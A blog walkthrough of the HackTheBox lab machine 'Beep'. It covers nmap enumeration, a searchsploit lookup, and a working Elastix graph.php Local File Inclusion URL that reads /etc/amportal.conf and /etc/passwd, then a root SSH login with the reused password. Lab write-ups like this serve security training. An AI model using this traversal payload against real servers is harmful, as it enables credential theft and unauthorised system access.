---
layout: post
author: dalemazza
title: HTB - Beep OSCP Walkthrough
date: 2020-07-04
category: HTB
tags: HTB
---

<p align="center">
  <img class="image" width="auto" height="auto" src="/assets/beep/beep.png">
</p>
Hi guys today I am tackling beep, One of the oldest boxes on HTB. I will be doing this box without metasploit, OSCP style. This box is a Linux box rated easy.  

This box includes the following techniques:  
* nmap
* searchsploit
* Local File Inclusion

***
### Quick overview  

This box is running a webserver that has elastix installed on. After trying the default credentials I could not get access. I searched for exploits relating to elastix and found a few. After trying many of them one finally worked. This exploit took me straight to Root!

I Start **nmap** scan as per normal.    
`sudo nmap -A -T4 -p- 10.10.10.7`
```
Nmap scan report for 10.10.10.7
Host is up (0.012s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: STLS PIPELINING UIDL RESP-CODES TOP LOGIN-DELAY(0) AUTH-RESP-CODE USER IMPLEMENTATION(Cyrus POP3 server v2) EXPIRE(NEVER) APOP
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: X-NETSCAPE NAMESPACE ACL Completed THREAD=ORDEREDSUBJECT CHILDREN CATENATE BINARY IMAP4rev1 MAILBOX-REFERRALS SORT=MODSEQ ID STARTTLS LISTEXT URLAUTHA0001 LIST-SUBSCRIBED IDLE CONDSTORE ANNOTATEMORE RENAME UIDPLUS ATOMIC RIGHTS=kxte IMAP4 LITERAL+ UNSELECT OK QUOTA NO MULTIAPPEND SORT THREAD=REFERENCES
443/tcp   open  ssl/https?
|_ssl-date: 2020-07-04T16:22:18+00:00; +3m04s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesnt have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|media device|PBX|WAP|specialized|printer|proxy server
Running (JUST GUESSING): Linux 2.6.X|2.4.X (95%), Linksys embedded (94%), Riverbed RiOS (94%), HP embedded (94%), WebSense embedded (93%), Gemtek embedded (93%)
OS CPE: cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:linux:linux_kernel:2.6.27 cpe:/o:linux:linux_kernel:2.4.32 cpe:/h:linksys:wrv54g cpe:/o:riverbed:rios cpe:/o:linux:linux_kernel:2.6 cpe:/h:gemtek:p360
Aggressive OS guesses: Linux 2.6.18 (95%), Linux 2.6.9 - 2.6.24 (95%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.27 (likely embedded) (95%), Linux 2.6.20-1 (Fedora Core 5) (95%), Linux 2.6.27 (95%), Linux 2.6.30 (95%), Linux 2.6.5 - 2.6.12 (95%), Linux 2.6.5-7.283-smp (SuSE Enterprise Server 9, x86) (95%), Linux 2.6.8 (Debian 3.1) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 3m03s

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   11.57 ms 10.10.14.1
2   11.72 ms 10.10.10.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/
```

That's a lot of stuff to enumerate! I like to start at port 80.  

The web server served me this page

<p align="center">
  <img class="image" width="auto" height="auto" src="/assets/beep/1.png">
</p>  
### Fig 1. Elastix login page  
This page is from elastix. Elastix is an unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality. It has a Web interface and includes capabilities such as a call center. After trying to default credentials I could not get access. Let's see if searchsploit has any exploits.

***
### What is searchsploit?
Searhsploit is a database of exploits. You can give it a program with or without the version and it will go out to several places to see if any exploits are found for that software. The results also give you the scripts used to exploit it.

```
searchsploit Elastix
```


<p align="center">
  <img class="image" width="auto" height="auto" src="/assets/beep/3.png">
</p>  
#### Fig 2. Searchsploit results  

Searchsploit has found a few exploits. I struggled to find the version of the the software running so I tried all the exploits. Eventually the **Elastix 2.2.0 - 'graph.php' Local File Inclusion** exploit worked!

Upon looking up the exploit on exploit DB [here](https://www.exploit-db.com/exploits/37637). I found that the exploit had a python script that executes an **LFI** in the graph.php current language path. I didn't need the whole script so i took the **LFI** location and tried it.  

<p align="center">
  <img class="image" width="auto" height="auto" src="/assets/beep/lfi.png">
</p>  
#### Fig 3. LFI location  

Now lets see if the exploits runs.

```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
```
<p align="center">
  <img class="image" width="auto" height="auto" src="/assets/beep/4.png">
</p>  
#### Fig 3. LFI exploits

It works! The page has a lot of text on the screen so i search for "pass"

<p align="center">
  <img class="image" width="auto" height="auto" src="/assets/beep/5.png">
</p>  
#### Fig 3. Admin credentials

Looks like the we have some admin credentials. One thing I notice is that this page contains the user and passwords for several programs, The same password and username keeps popping up, maybe he use's that for everything?

Let's see what `/etc/passwd` gives us

<p align="center">
  <img class="image" width="auto" height="auto" src="/assets/beep/6.png">
</p>  
#### Fig 4. etc/passwd

Here we can see that there is a user called 'fanis', we have not got a password for that yet. Let's be cheeky and see if I can read the `root.txt`

<p align="center">
  <img class="image" width="auto" height="auto" src="/assets/beep/7.png">
</p>  
#### Fig 5. No access to root.txt

Worth a shot! Let's see if the admin reuses his credentials
```
ssh root@10.10.10.7
```
<p align="center">
  <img class="image" width="auto" height="auto" src="/assets/beep/10.png">
</p>  
#### Fig 6. SSH error

That is a weird error. After googling I found that this happens when connecting to old deprecated versions of **SSH**. We have to use a flag to connect to this machine.
```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
```
<p align="center">
  <img class="image" width="auto" height="auto" src="/assets/beep/8.png">
</p>  
#### Fig 7. root

It worked! Looks like we have root aswell! Time to get those flags!
```
cat root.txt

cat /home/fanis/user.txt
```

This was a fairly easy box, There are many methods to root this box but this is the one I found. Thanks
